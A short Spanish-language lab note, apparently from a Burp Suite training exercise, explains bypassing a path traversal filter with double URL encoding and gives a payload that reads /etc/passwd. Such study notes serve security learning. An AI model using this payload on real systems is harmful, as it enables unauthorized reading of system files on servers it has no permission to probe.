# Bypass con doble decodificación en URL

Tags: #DirectoryPathTraversal #BurpSuite 

```bash 
En este lab la aplicación bloquea directamente las secuencias '../', pero comete el error de decodificar la entrada una vez más después del filtrado. Se aprovecha esto utilizando '..%252f', que al ser decodificado dos veces se transforma en '../', permitiéndo realizar un path traversal efectivo.
```

```bash 
	?file=..%252f..%252f..%252f..%252fetc/passwd      # Mirar un archivo en específico 

	# / = Así es la barra urlencodeada '%2f'
	# % = Se debe de urlencodear el % y queda así '%25' por lo que la forma final es '%252f'
```